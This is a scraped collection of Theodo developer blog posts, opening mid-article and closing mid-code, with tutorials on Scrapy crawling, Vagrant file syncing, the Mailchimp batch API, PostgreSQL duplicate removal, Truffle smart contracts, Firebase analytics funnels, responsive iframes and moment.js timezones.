class BlogSpider(scrapy.Spider):
    name = ""blog""
    start_urls = ['http://blog.theodo.fr/']

    def parse(self, response):
        for article_url in response.css('.entry-title a ::attr(""href"")').extract():
            yield response.follow(article_url, callback=self.parse_article)
        older_posts = response.css('.nav-previous a ::attr(""href"")').extract_first()
        if older_posts is not None:
            yield response.follow(older_posts, callback=self.parse)

    def parse_article(self, response):
        content = response.xpath("".//div[@class='entry-content']/descendant::text()"").extract()
        yield {'article': ''.join(content)}

Now, our BlogSpider extracts all URLs of articles and calls the parse_article callback and then extracts the URL of the “Older posts” button.
It then follows the URL and applies the parse callback on the previous page of our blog.
If you run the command scrapy runspider blog_spider.py -o blog.json, you will see that our Spider will visit every article page and retrieve the content of each article since the beginning of our blog!
Going further

We could have also used a CrawlSpider, another Scrapy class that provides a dedicated mechanism for following links by defining a set of rules directly in the class.
You can look at the documentation here.
In the parse_article function, we retrieved all the text content but that also includes the aside where we have the author of each article.
To remove it from the output, you can change the xpath by response.xpath("".//div[@class='entry-content']/descendant::text()[not(ancestor::aside)]"").
You can see that the output of the scraper is not perfect as we see some unorthodox characters like \r, \n or \t.
To exploit the data, we would first need to clean what we retrieved by removing unwanted characters.
For example, we could replace \t characters to a space with a simple content.replace('\r', ' ').


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thomas Mollard
  			
  				Web Developer at Theodo  			
  		
    
			

									"
"
										Vagrant offers the possibility to sync files between your host and your VM, a great way to edit your code on your favorite IDE while being able to run it in a VM.
Not all files are worth syncing though – have you ever wished to specifically avoid syncing heavy folders to your host such as your node modules or your error logs?
Let’s see how doing this can lead to tripling the speed of your npm install.
You have different ways to sync your files with Vagrant. For performance you probably want to use NFS – only available if your host is macOS or Linux.
Disabling the sync of node modules

On one of my projects, I was hit by a file sync issue between my host and my VM, due to the then recently released Apple APFS filesystem.
To mitigate this issue I needed to find a way to avoid my node modules to be synced from my VM to my host, and was helped by a trick found on Stack Overflow.
The idea here will be to replace in your VM your node_modules folder with a symbolic link pointing to a folder outside of the synced folder(s) – hence, content of node_modules won’t be synced to your host.
What your host will see will only be the symbolic link, which won’t point to an actual folder on your host – this shouldn’t cause any issue.
Let’s say you have already set up a Vagrant synced folder with NFS, for example thanks to the following line in your Vagrantfile:
config.vm.synced_folder ""."", ""/your-project"", type: ""nfs""

If you have already run npm install you first need to move the node_modules outside of your synced folder:
⚠️ Note: all commands from now on are to be run in your VM
$ cd /your-project
$ mv node_modules /outside-of-synced-folder

If you haven’t, you need to create the folder:
$ mkdir /outside-of-synced-folder/node_modules

Once node_modules has been moved or created, you can create the symbolic link in your project directory:
$ ln -s /outside-of-synced-folder/node_modules /your-project/node_modules

Then you can run:
$ npm install

Case in point
Trying this with Sound Redux, a popular open-source React project, we time npm install on a 2017 MacBook Pro:
It will take 41s if node_modules is synced to the host, and only 14s if not (a 3x improvement)
With Sentry (the crash reporting platform), we go from 1mn30 to 26s (a 5x improvement)
Finally, on my own project using Angular and an older version of npm, we go from 9mn to 3mn (a 3x improvement).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ivan Poiraudeau
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
Mailchimp is a marketing tool that lets your marketing department have autonomy to control their own marketing emails. As developers, we can also use the flexible API for custom integrations. When we combine the two, we get a powerful and flexible tool that allows for complex marketing campaigns that are specific to product needs.
A key Mailchimp feature is lists – these are a collection of customers that receive your marketing campaigns. Each customer in the list can have a number of properties, called merge fields that use to assign additional data to each customer. These properties can then be rendered in emails, or used to segment the customers to send campaigns to a specific subset of our list.
The common use case for Mailchimp is having one list for all of your customers, using segments to send specific campaigns. We can specify a segment that has a date of birth in august, or everybody called John to target them specifically. However, when you would like to segment your customers in a more complex manor – such as customers who behave in a particular way on your application the previous day, mailchimp leaves you stuck.
We could have merge field that indicates whether a customer is eligible for inclusion in a segment, however we are unable to segment based on relative dates such as yesterday. To solve this, we generate our own list and the integrated API to populate with the customers we want. We all we need to do in Mailchimp is set up an automated campaign mail to send out daily to the automatically populated list.
Setting up
You’ll first need a Mailchimp account, and API key (which can be generated in the user settings for your application). You’ll then need to create the list on mailchimp, use the GUI on the site as its much easier than the API. Leave the merge fields empty for now, we will come back to them later.
We connect to the api using the python package mailchimp3. For this example, we’ll assume we have a customer and activity models – where customers can have many activities. Firstly we need to configure mailchimp3, to generate the api client we write the following:
from mailchimp3 import MailChimp
from django.conf import settings

client = MailChimp(MAILCHIMP_USERNAME, MAILCHIMP_API_KEY)

We can then check out what lists we have by running:
client.lists.all(get_all=True, fields=""lists.name,lists.id"")

This will return the names and IDs for all of the lists our account has. Now take note of the list ID you want to dynamically update – we’ll refer to this list ID as MAILCHIMP_LIST_ID.
Creating the extract
The first step is to create an extract which contains all the customers and relevant merge fields for the Mailchimp list. This is very business specific and can be as complex as you like. We use a simple example that returns all the customers who had an activity longer than 5 minutes yesterday:
from app.models import Activity
from django.utils.timezone import timedelta, now

def generate_extract(duration):

    kwargs = {
        'activity_date': now() - timedelta(days=1)
        'activity_duration': 300
    }
    return Activity.objects.filter(**kwargs) \
        .select_related('customer') \
        .distinct('email')

Now have a function that gets us our list of members, we need to transform them into a format that Mailchimp is expecting. The Mailchimp API lets us chose between making a request for each member we want to add, or to batch the requests into a single request. We choose the later implementation as we will be adding many customers to the list at a single time.
Sending to Mailchimp
The batch endpoint expects a list of operations that are in the mailchimp API format. For adding users to a list that is a POST request to /lists/MAILCHIMP_LIST_ID/members, with the body of each request being JSON in the following format:
{
    'status': 'subscribed',
    'email_address': 'xxx@gmail.com',
    'merge_fields': {
        field_1: xxx
        ...
    }
}

Where we can pass as many or as few merge fields as we like.
Given this, we need to create a function that takes a single customer model and returns an dict in this format with the merge_fields key containing an object with all the merge fields we want to include for our list! We can sends different types of data here, strings, numbers and dates for example.
def customer_to_mailchimp_member(customer):

    return {
        'status': 'subscribed',
        'email_address': 'xxx@gmail.com',
        'merge_fields': {
            FIRSTNAME: customer.first_name,
            LASTNAME: customer.last_name,
            DOB: customer.date_of_birth
        }
    }

Now we have this transformation function, we can apply it to every customer to create a list of members ready to upload.
Configuring the list
The next step is configure the mailchimp list to match all of the merge fields we want to include with our users. Mailchimp provides an easy to use interface to set this up, in the settings of your list under List fields and |* merge *| tags. Here you’ll need to specify the type of each merge field, and ensure the merge tag exactly matches the key in the merge_fields object from the customer transformer.
After the settings are configured, all that remains is to upload the users.
Uploading
Next we need to create a list of operations that make the POST request to our Mailchimp list endpoint. We write the following general for adding members already in a format ready to upload, given a list:
def batch_add_members_to_list(members, list_id):

    operations = [{
        'method': 'POST',
        'path': '/lists/' + list_id + '/members',
        'body': json.dumps(member)
    } for member in members]

    client.batches.create(data={'operations': operations})

Here we see that we construct a list of operations in a standard format to send to the endpoint, then we use the API client to make a single request which contains all of our operations. When Mailchimp receives this, it creates a new batch object attached to our account and returns the batch ID amongst other information about the newly created batch.
Managing batches
Once you send a batch to Mailchimp it may take some time to execute the operations contained in the request. You can track the progress of a batch using:
client.batches.get(BATCH_ID)

This will return an object that tells you the status of the batch, which is pending when it is queued, started once Mailchimp has begun executing the operations and finished once it is complete. Once the batch has finished the response object will tell us how many operations completed, and how many failed. Further, we can get the results of all the operations contained within from the response_body_url object – this is a link to a JSON array of responses for each operations request.
Once a batch is complete, you can view the members added to the list! Alternatively, if it hasn’t worked for you, you can debug using the batch management mentioned above.

To automatically add customers to our list, we use a webbook in our application that is called from an AWS lambda function at a specific time. The webhook then generates the customers and adds them to our Mailchip list using the method outlined above.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Josh Warwick
  			
  				  			
  		
    
			

									"
"
										

I was working on a project where we needed to aggregate information on employees from 10 different tables and make the resulting table clear (no duplicate rows), containing full information on people working in the big company.
While making this I understood that the emergence of duplicates (or duplicate rows) is inevitable when you work with a large amount of data aggregating several tables into one. Fortunately PostgreSQL has some features that are extremely useful while working with detection and elimination of duplicates.
I want to put your attention on these features and help you to never have problems with duplicates.
Duplicate or Duplicate row is a row in a table looking exactly or almost exactly like some another row (original row) in this table.
So we can deal with absolutely identical rows and almost identical rows. For example theirs ids can differ but all other properties are exactly the same.
So, what can you do with the duplicates?
For absolutely identical rows:

Find them
Delete them

For almost identical rows (identical except for one or more properties):

Combine information from duplicate rows into one row
Select one of the rows according to some criteria and delete the remaining ones.

That is what my article is about.
1) How to find duplicates?
Imagine you have a table containing some data on employees of a company. For example, in this table we are dealing with personal data about employees including their first name, last name, position, department and date of the beginning of a contract in these department on these position.
+----+-----------+-----------+------------+---------------+-------------+
| id | firstname | lastname  | startdate  | position      | department  |
+----+-----------+-----------+------------+---------------+-------------+
| 1  | Olivier   | Le Blanc  | 2010-03-01 | PDG           | RTM         |
| 2  | Maria     | Green     | 2016-06-01 | Intern        | STP/RMP     |
| 3  | Maria     | Green     | 2016-11-01 | RH            | STP/RMP     |
| 5  | Maria     | Green     | 2017-07-07 | DRH           | STP/RMP     |
| 4  | Paul      | Jones     | 2017-01-01 | Developer     | RTM/FMP     |
| 6  | Paul      | Jones     | 2017-06-01 | Project Chief | RTM/BSO     |
+----+-----------+-----------+------------+---------------+-------------+


In order to find duplicates we face two problems:

Count the number of rows in each group.
Find duplicate rows and theirs ids

Here is the fastest way to split rows into categories and to display those that have more than one row in it.
SELECT
  firstname,
  lastname,
  count(*)
FROM people
GROUP BY
  firstname,
  lastname
HAVING count(*) > 1;

+-----------+-----------+-------+
| firstname | lastname  | count |
+-----------+-----------+-------+
| Maria     | Green     |   3   |
| Paul      | Jones     |   2   |
+-----------+-----------+-------+


Count(*) counts the number of rows in each group.
In GROUP BY we can add the criterias (properties) by which we are looking for duplicates.
The result is a table (firstname, lastname, count) containing the properties according which the groups were defined and the number of rows per group.

Now we want to display duplicate rows with all information.
SELECT * FROM
  (SELECT *, count(*)
  OVER
    (PARTITION BY
      firstname,
      lastname
    ) AS count
  FROM people) tableWithCount
  WHERE tableWithCount.count > 1;

+----+-----------+----------+--------------+---------------+------------+---------+
| id | firstname | lastname |  startdate   | position      | department |  count  |
+----+-----------+----------+--------------+---------------+------------+---------+
| 2  | Maria     | Green    |  2016-06-01  | Intern        | STP/RMP    |    3    |
| 3  | Maria     | Green    |  2016-11-01  | RH            | STP/RMP    |    3    |
| 5  | Maria     | Green    |  2017-07-07  | DRH           | STP/RMP    |    3    |
| 4  | Paul      | Jones    |  2017-01-01  | Developer     | RTM/FMP    |    2    |
| 6  | Paul      | Jones    |  2017-06-01  | Project Chief | RTM/BSO    |    2    |
+----+-----------+----------+--------------+---------------+------------+---------+


PARTITION BY divides into groups and disposes all rows that are presented one after another.
Using PARTITION BY and ‘count > 1’ we can extract rows having duplicates.
The result is a table with columns (id, firstname, lastname, startdate, position, department, count) where we see all the duplicate rows including the original row.

By the way, through the PARTITION BY it is possible to simplify a whole class of tasks of analytics and billing. Instead of count(*) we can use any function like MEAN, MAX, MIN, SUM… and calculate a value per group. Mean salary is a good example.
2) How to delete duplicates?
The next question that inevitably arises: how to get rid of duplicates?
Here is the most efficient and fastest way to select data without unnecessary duplicates:
For absolutely identical rows:
SELECT DISTINCT * FROM people;

For almost identical rows:

SELECT DISTINCT ON (firstname, lastname) * FROM people
In the case of almost identical rows we need to list all properties on the basis of which we are looking for duplicates.
Thus, if we want to remove duplicated data from a table, we can use the following method :
DELETE FROM people WHERE people.id NOT IN 
(SELECT id FROM (
    SELECT DISTINCT ON (firstname, lastname) *
  FROM people));

For those who have read this article up to this point, here is a very cool tip of PostgreSQL to keep your code clean and readable.
WITH unique AS
    (SELECT DISTINCT ON (firstname, lastname) * FROM people)
DELETE FROM people WHERE people.id NOT IN (SELECT id FROM unique);

A very useful thing for complex queries where without named subqueries you can break your entire brain, conjuring with joins and brackets of subqueries. This incredibly useful feature is called Common Table Expression. By the way, there is a possibility to use multiple subqueries and one subquery can be based on another subquery. You can learn more here.
WITH some_name AS
 (SELECT DISTINCT ON (firstname, lastname) * FROM people),
some_another_name AS (SELECT id, position, department FROM some_name)
SELECT * FROM some_another_name WHERE ... ;

3) How to combine duplicate rows in one single row
Now we come to something more interesting. We want to make sure that each category has only one row but we don't want to lose any information. The best way to do this is to remove duplicates while merging their records into one row. For example, we want to have only one row per person, but for which both position values and department values are written into one cell in the following way 'value 1 / value 2 / ...'. This is easily accomplished by using the function of concatenation 'string_agg'.
SELECT
  firstname,
  lastname,
  string_agg(position, ' / ') AS positions,
  string_agg(department, ' / ') AS departments
FROM people
GROUP BY
  firstname,
  lastname;


+-----------+----------+---------------------------+-----------------------------+
| firstname | lastname | positions                 | departments                 |
+-----------+----------+---------------------------+-----------------------------+
| Maria     | Green    | Intern / RH / DRH         | STP/RMP / STP/RMP / STP/RMP |
| Olivier   | Le Blanc | PDG                       | RTM                         |
| Paul      | Jones    | Developer / Project chief | RTM/FMP / RTM/BSO           |
+-----------+----------+---------------------------+-----------------------------+

GROUP BY separates data on categories.
string_agg() aggregates information from duplicate rows
No matter how many duplicates we have, in the end we’ll have just three rows with combined information.

4) How to delete unwanted duplicates and save exactly what you want
Now let’s imagine that for every employee there are two properties indicating the start date and the end date of a contract.
If some person changed several positions in the company, there are few corresponding lines in the table. For each employee we need to find a row corresponding to the last contract, not taking into account the previous contracts. That is, in fact, find a contract with the latest start date.
You can do this as follows:
SELECT id, firstname, lastname, startdate, position FROM
  (SELECT id, firstname, lastname, startdate, position,
     ROW_NUMBER() OVER 
(PARTITION BY (firstname, lastname) ORDER BY startdate DESC) rn
   FROM people
  ) tmp WHERE rn = 1;
+----+------------+----------+--------------+---------------+
| id | firstname  | lastname |  startdate   | position      |
+----+------------+----------+--------------+---------------+
| 5  | Maria      | Green    |  2017-07-07  | DRH           |
| 1  | Olivier    | Le Blanc |  2010-03-01  | PDG           |
| 6  | Paul       | Jones    |  2017-06-01  | Project Chief |
+----+------------+----------+--------------+---------------+

PARTITION BY divides into groups and ORDER BY sorts them by descending order.
ROW_NUMBER() assigns an integer number to every row in each category.
To have rows with the latest date we simply choose those with row number equals to 1.
Notice that we need to have some name for a query in brасkets. It's better to use a common table expression WITH ... AS 

Conclusion
As you can see, working with duplicates is not so difficult. They are easy to be detected and to be removed if necessary.

"
"
										Understanding the concepts behind a blockchain is not as hard as one could imagine.
Of course some specific concepts of a blockchain environment are harder to understand (e.g. mining) but I will try first to give you a simple introduction to the most important concept of blockchain.
Then we will write a first smart contract inside a blockchain.
That will be the first step before trying to build a decentralized web application implementing smart contracts!
Basically a blockchain is a chain of block, more precisely a linked chain of blocks.

A block is one element of a blockchain and each block has a common structure.
The security of a blockchain is assured by its decentralized nature.
Unlike a classic database, a copy of the blockchain is stored in each node of its peer-to-peer network.
In the case where the local version of a blockchain in a networks node were corrupted, all the other nodes of the P2P network would still be able to agree on the actual value of the blockchain: thats the consensus.
In order to add a fraudulous transaction to a blockchain, one should be able to hack half of the user of the network.
Furthermore, it is also very hard to alter even only a local version of a blockchain because of a block structure.
Block structure
What is interesting in the concept of blockchain is that we can store any kind of data with very high security. Data is stored inside a block that contains several elements:

A hash
The hash of the previous block
An index (number of the block in the chain)
A nonce (an integer that will be used during the mining process)
A timestamp
The data
A hash representing the data

If you are not familiar with the concept of hash, the important things to know are:

From a very large departure set (typically infinite and very diverse), a hash function gives back a string of fixed length
The hash of a block is easy to calculate
Given a hash, it is impossible to build a message with this hash value
If you modify the message (even very slightly), you totally change the hash
It is almost impossible to find two messages with equal hash

The hash of a block is calculated by taking as argument the hash of the previous block, the index, the nonce, the timestamp, and a hash representing the data of the current block.
Among these inputs, the nonce will vary during the process of mining but of course the others stay fixed.
Because of the properties of a block, if you try to change the transactions/data inside a block, its hash will not be consistent with the data anymore (neither will be the previous hash of the next block).
Mining a block
When a block is created, nodes of the network will try to mine it, which means to insert it into the blockchain.
The miner who succeeds will get a reward.
Proof of work
In order to mine a block, you have to find a valid hash for this block, but as you may remember a hash is quite easy to calculate.
Thats why you need to add a condition on the desired hash, typically a fixed number of zeros the hash must start with.
The proof-of-work enhances blockchain’s security because of the considerable amount of calculation needed to modify a single block.
To conclude, a miner has to solve a time consuming mathematical problem to mine a block.
The nonce
A nonce is an integer which will be incremented during the mining process.
Without a nonce, the data of a block is constant, and thus the hash function always returns the same result.
If your hash consists of hexadecimal characters, and you want to have a hash starting with 5 zeros you will have a probability of 1/1048576 to produce a hash verifying this condition with a random nonce.
Each time you fail to get a hash verifying the condition, you can update the nonce and try again.
This assures that the miners of the network will have to work to add a block to the blockchain and thats why this algorithm is called proof of work.
Smart Contracts
Smart contracts have been introduced in the ethereum blockchain.
This is some code written inside the block of a blockchain that is able to execute a transaction if some conditions are fulfilled.
It is useful when the execution of a contract depends on some difficult conditions, or when you usually use a third-party to ensure the execution of the contract.
Initializing the project
In this part we will write a smart contract using Solidity, the programming language used in the ethereum blockchain and Truffle; a development environment for Ethereum.
We will use Ganache (you can download it here which will give us access to a personal ethereum blockchain in order to test our smart-contracts and deploy them in a blockchain.
First, lets install Truffle and initialize our project by running the following commands:

npm install -g truffle
mkdir my-first-smart-contracts
cd my-first-smart-contracts
truffle init

The truffle init command will provide the basic folders and files of your project:

contracts/
migrations/
test/
build/
truffle.js
truffle-config.js

You can now open Ganache.
You will see 10 fake accounts that we can use and a local blockchain with only one initial block.
You can also see the port where your local blockchain runs. It should be by default HTTP://127.0.0.1:7545.

Let’s open your truffle.js file and modify it to connect it with the blockchain.

module.exports = {
    networks: {
        development: {
            host: 'localhost',
            port: 7545,
            network_id: '*'
        }
    }
};

Our first smart contract
In our contracts folder, we will create a basic smart contract Message.sol.
It will only enable us to write a message in the blockchain but it will be a good start to understand the way solidity works.

pragma solidity ^0.4.17;

contract Message {

    bytes32 public message;

    function setMessage(bytes32 newMessage) public {
        message = newMessage;
    }

    function getMessage() public constant returns (bytes32) {
        return message;
    }
}

As you can see, a contract looks like a regular class in another language.
However, unlike a typical class, there is no this to access instance variables.
The state variables, like message here, can be read or written directly.
Solidity is a typed language, you have to declare the types of the variables you create and specify the types of function arguments (like in setMessage) and returned values (like in getMessage)
A call to setMessage will add a transaction to the blockchain and thus cost you gas because it modifies the state of the contract.
Gas is the amount you have to pay for running a transaction.
The miner can decide to increase or decrease the amount of gas according to its need.
However you want to be able to access the value in the blockchain without spending gas, that’s why we precise constant in getMessage declaration.
You may wonder why we used the type bytes32 and not string which exists in solidity.
The main reason is that writing to the ethereum blockchain costs ether.
The type string, being dynamically sized, is more expensive to use when writing data in the blockchain than the type bytes32.
Deploying to the test blockchain
Our contract being written, we now want to deploy it on the network.
In order to do this we have to write a migration file in javascript.
In the folder migrations/ let’s create a new migration file called 2_message_migration.js.
It is important to write the ‘2’ because Truffle will execute the migrations in the order of the prefix.

var Message = artifacts.require('./Message.sol');
module.exports = function(deployer) {
    deployer.deploy(Message);
};

The artifacts.require method is similar to the require of node and will tell Truffle which contracts you want to interact with.
The name of the variable must match the name of your contract.
The deployer object gives you access to the deployment function.
Our example is the easiest one.
Back to the shell, we can now deploy our contract to the blockchain:

truffle compile
truffle migrate

In ganache you can now see new blocks automatically mined and corresponding to the deployment of your contract in your blockchain!

Interacting with the contract
The contract being deployed on our local blockchain, we can now write our first transactions and see what happens.
To interact with the contract we can use directly the truffle console and write javascript in it or write a script and run it.
In this example we will interact directly in the console.

truffle console
var message;
Message.deployed().then(function(instance){message = instance;})
message.setMessage(web3.fromAscii('Premier message !'));

If you go back to Ganache, you will see that a new block has been added to the blockchain, that’s because setMessage is a transaction and modifies the state of our contract.

message.getMessage().then(function(message){console.log(web3.toAscii(message));})

Functions from contract are promisified, that’s why we use then to access the data. Moreover, as we used the type bytes32 to write our message, we have to add web3.fromAscii and web3.toAscii to write and read our message.
This last command should return the value of your message but if you look at your blocks in Ganache, you will not see any new blocks as this getter function did not modify the state of your contract.
Testing a contract
Truffle easily enables you to create tests for your contracts. It comes with its own assertion library which provides you classic test hooks beforeEach, afterEach, beforeAll, afterAll, and assertions equal, notEqual, isEmpty…

import 'truffle/Assert.sol';
import 'truffle/DeployedAddresses.sol;
import '../contracts/Message.sol';

contract TestMessage {
    function testSetMessage() {
        Message messageContract = Message(DeployedAddresses.Message());
        messageContract.setMessage('Hello World!');
        bytes32 expected = bytes32('Hello World!');
        Assert.equal(messageContract.getMessage(), expected, 'The message should be set');
    }
}

The contracts you deployed on the blockchain are available through the DeployedAddresses.sol library.
It is mandatory that your test contract and your test file start with ‘Test’, followed by the name of the contract.
The test being written you can now run it in the console:

truffle test
Using network 'development'.

Compiling ./contracts/Message.sol...
Compiling ./test/TestMessage.sol...
Compiling truffle/Assert.sol...
Compiling truffle/DeployedAddresses.sol...
TestMessage
✓ testSetMessage (55ms)

1 passing (402ms)

Next steps
We learnt how blockchain works and what a smart contract is but most importantly how to develop using the truffle environment thanks to a simple example.
The next step is to write one or more sophisticated contracts and build a web app to interact with them!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Pinsard
  			
  				Currently Web Developer at Theodo. Also very curious about AI, machine learning and blockchain.  			
  		
    
			

									"
"
										Google Analytics funnels are a standard way to monitor conversion on a typical purchase flow (e.g. buying a book on an ecommerce site, subscribing to an online service or taking out an insurance policy). Google have moved to have Firebase as their standard mobile app analytics platform, and there is good support to get up and running in react-native with this (see react-native-firebase).
Marketing departments are more used to working with traditional GA, and Google have therefore made it easy to link a Firebase app to a GA app. You would think this would mean your marketing department can jump on an make a funnel in no time, but the funnel is based on events and although the default screen view is an event, the name of the screen is a parameter that can’t be accessed when building the funnel (as of this point in writing).
Assuming you’ve set up firebase in your react-native project, the default screen view event to use would be something like:
firebase.analytics().setCurrentScreen(action.routeName);
This though would go through as a screen_view event and you would not be able to build a funnel:

There are two options to resolve this:

Make an event per page, rather than just using the screen_view event and then you can build your funnel.
 Link to BigQuery and build your own funnel using the raw data

 
Option 1 will be the least strain on your marketing department, but means that past data you’ve recorded in your app can’t be used. As the marketing department is the primary user of analytics, option 1 is my suggestion and you can do adhoc work in BigQuery if you need past analysis. 
To trigger an event per page using the same library as before the syntax is much the same: 
firebase.analytics().logEvent(`Page_${action.routeName}`, {});
Put this in the same point in your code as the original command (and keep the original one in case GA’s tooling improves).
To get all the custom events available to build your funnel you need to go through the app manually triggering the events at least once, which is a pain, but your users could do this naturally for you if you can wait. (Note: although you see the events in the live view it can take a while for them to propagate up to the event options.)
Now your marketing team can build funnels to their hearts content, and if your event logic is in your default navigator new pages will automatically appear as events ready for them to add to their funnel. 
Hopefully GA’s support for funnels will include parameter filters in the future, but until then this is a low cost workaround.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				I'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. 

I'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.

https://www.linkedin.com/in/benjaminellerby/  			
  		
    
			

									"
"
										Nowadays, more and more people use their phones to navigate the web. It is therefore even more important now for websites to be responsive. Most websites use YouTube videos, Google maps or other external website elements embedded in them. These functions are most commonly incorporated in a web page using the html iframe element and is one of the trickiest thing to make responsive.
I have struggled for a long time to get my YouTube videos to keep their ratio on different screen sizes. When testing my website on a smartphone, I would spend hours trying to figure out why my videos did not do what I expected… Until I finally discovered a great CSS trick that I can apply to all my iframes. Play with the size of the screen to see the responsive iframe at work. I can’t wait to share this trick with you in the following article.
Responsive Iframes
For the purpose of demonstration, this article will use a YouTube embed for our iframe. First, go on YouTube, click on ‘share’ under the video and then ‘embed’. You should now have the following code to copy into your html.
<iframe width=""560"" height=""315"" src=""https://www.youtube.com/embed/dQw4w9WgXcQ"" frameborder=""0"" gesture=""media"" allow=""encrypted-media"" allowfullscreen></iframe>

Next, we need to remove width=”560″ height=”315″ because these are here to set the size of the iframe. Since we are going to be setting the size ourselves, this is unnecessary for our purposes.
Using CSS
Afterwards, we need to wrap the iframe in another html element like a <div>, this is very important as this element will be sizing your iframe. Then add a CSS class to your new wrapping element and one class to your iframe as seen below.
<div class=""resp-container"">
    <iframe class=""resp-iframe"" src=""https://www.youtube.com/embed/dQw4w9WgXcQ"" gesture=""media""  allow=""encrypted-media"" allowfullscreen></iframe>
</div>

Define your wrapper class with the following style:
.resp-container {
    position: relative;
    overflow: hidden;
    padding-top: 56.25%;
}


position: relative The position of both the wrapper and the iframe is very important here. We are setting it to a position: relative so that we can later position our iframe in relation to the wrapping element. This is because in CSS, position: absolute positions the element based on the closest non static parent element.
overflow: hidden is there to hide any elements that might be placed outside of the container.
padding-top: 56.25% This is where the magic is. In CSS, the padding-top property can receive a percentage, this is what keeps our iframe to the right ratio. By using percentage, it will calculate the padding to use based on the width of the element. In our example, we want to keep the ratio of 56.26% (height 9 ÷ width 16) because this is the default ratio for YouTube videos. However, other ratios can be used as well.

Define your iframe class as follows:
.resp-iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 0;
}


position: absolute; This will give the iframe a position relative to the wrapper and let it be positioned over the padding of the wrapper.
top: 0 and left: 0 are used to position the iframe at the center of the container.
width: 100% and height: 100% make the iframe take all of the wrapper’s space.

Demo
Once you are done, you should get an iframe that is responsive. Here I have a <video> instead because of some blog restrictions. But it works exactly the same way. You can play around with your browser size and see how responsive your iframes would be!

Using CSS Frameworks
Most projects will use some kind of CSS framework to help with keeping the styling uniform throughout the project, may it be Bootstrap or Material-UI. Some of these frameworks already have predefined classes that will do exactly the same as what is in the above trick but unfortunately not all. In each case you need to create a wrapping element and give it a certain class.
Using Bootstrap
In Bootstrap 3.2 and over, use the predefined class .embed-responsive and an aspect ratio class modifier like .embed-responsive-16by9. There are other ones listed below. Similarly to the trick above, this aspect ratio modifier will add the padding-top with different percentages depending on the given modifier class. Then give your iframe the .embed-responsive-item class. Here is an example:
<div class=""embed-responsive embed-responsive-16by9"">
  <iframe class=""embed-responsive-item"" src=""https://www.youtube.com/embed/dQw4w9WgXcQ"" allowfullscreen></iframe>
</div>

The different aspect ratios that can be used are:

.embed-responsive-21by9
.embed-responsive-16by9
.embed-responsive-4by3
.embed-responsive-1by1

You can of course create your own modifier class. For example:
.embed-responsive-10by3 {
   padding-top: 30%;
}

Using Materialize
If you are using Materialize CSS, then you don’t need your own classes either. Just add the video-container class to your wrapper:
<div class=""video-container"">
  <iframe src=""//www.youtube.com/embed/Q8TXgCzxEnw?rel=0"" frameborder=""0"" allowfullscreen></iframe>
</div>

Using Foundation
<div class=""responsive-embed"">
  <iframe src=""https://www.youtube.com/embed/mM5_T-F1Yn4"" frameborder=""0"" allowfullscreen></iframe>
</div>

Aspect ratio modifier classes are set in your $responsive-embed-ratios map in your Foundation settings file:
$responsive-embed-ratios: (
  default: 16 by 9,
  vertical: 9 by 16,
  panorama: 256 by 81,
  square: 1 by 1,
);

Responsive Images
Images are a lot easier to deal with. With only a little CSS, you can have images keep their original aspect ratio whatever the size of the screen.
Using width
If you do not set the width to a fixed amount, but instead you fix it to 100% with a height: auto as so:
img {
    width: 100%;
    height: auto;
}

Then your images will be responsive and keep their ratio. However, using width means your images can scale to larger than their original size though and you could end up with a blurry image.
Using max-width
If you don’t want your images to be larger than the original size, then use max-width: 100% instead:
img {
    max-width: 100%;
    height: auto;
}

In the end, you will get responsive images, just like this one:

Summing it all up
In conclusion, in this article we have seen the CSS trick that can make your iframes responsive. We have also seen multiple popular frameworks that provide predefined classes that will do it for you. As you saw, it’s actually pretty easy and I hope I saved you hours of trying to fit your iframes on your mobile. Lastly, you saw how easy it is to fit your images in your responsive website.
Let me know below in the comments what you think of the article and if you have any questions about anything above.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Gregory Gan
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Handling dates when dealing with timezones is a difficult task.
Fortunately for us, there are many libraries like moment.js helping us to handle common issues like timezones, daylight saving time, manipulation and date formatting.
I recently encountered several issues in displaying dates in the correct format and timezone whilst working on a mobile application project.
An external server which sends us local date time as a string and timezone like this:

{
  localDateTime: 'YYYY-MM-DD HH:mm', // Not in UTC
  timezone: 'Indian/Reunion', // Or 'Europe/Paris''
}

I had to display and manipulate these dates. But before that, I needed to parse and store them. To be more specific with the  about the use case is drawn above a diagram of the date flow in my application.

In this article, I will show you how to deal with common difficulties in date handling with one of the most standard libraries: moment.js.
What is moment ?
Moment is a very comprehensive and popular library for handling dates. It can be thought of as the standard in javascript. It provides functions to parse, manipulate and display dates and times. Moment-timezone.js adds functions to handle dates and times for different countries.
On the other hand, one should be aware that moment dates are mutable. I will deal with this issue in the manipulation part of this article.
I will focus on explaining the flow of date handling in a full JS application. I will also shed light on some tricky points of moment.
Time zone
So, what is a timezone?
Time zone is a region of the globe that observes a uniform standard time which are offset from Coordinated Universal (UTC). A time zone sets the time according to the distance from the prime meridian. Some time zones change their offset during the year. This is called daylight saving time (DST).
In the map above, you can see the time in every part on the world corresponding to the timezone without DST.

Note: There is no time difference between UTC and Greenwich Mean Time (GMT). But UTC is a standard time whereas GMT is a timezone.
How to store a date
Parse the date string
When you receive a date string, you should first parse it to get the correct datetime before storing it in your database.
According to the format
Moment provides a function moment(date: string, format: string) to convert a string into a moment object according to the format. 

const moment = require('moment')

const dateToStore = '2018-01-27 10:30'
const momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')
